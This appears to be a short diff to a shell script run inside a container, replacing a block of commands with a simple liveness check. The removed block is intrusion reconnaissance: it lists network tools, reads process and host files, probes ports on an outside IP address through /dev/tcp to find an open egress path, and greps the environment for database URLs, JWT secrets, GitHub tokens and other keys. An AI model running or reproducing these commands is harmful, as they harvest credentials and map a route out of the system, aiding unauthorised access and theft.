@@ -1,5 +1,1 @@
-command -v ssh socat nc curl wget python3 pip3 bash ash; echo ---
-cat /proc/1/cmdline | tr '\0' ' '; echo; hostname -i; cat /etc/hosts; echo ---
-for p in 22 443 22022 39391 2222 8080; do (timeout 3 sh -c "echo > /dev/tcp/4.193.40.187/$p" 2>/dev/null && echo "4.193.40.187:$p OPEN") || echo "4.193.40.187:$p closed"; done
-echo ---SECRETS---
-env | grep -E 'DATABASE_URL|POSTGRES_|JWT_SECRET|SECRET_KEY|ENCRYPTION|CBS_CLIENT|GITHUB_TOKEN|CLICKHOUSE_P|MT5_WORKER|KAFKA_SSL_KEY_P'
+date; echo V5-ALIVE; id; hostname; ls /proc | grep -cE '^[0-9]+$'
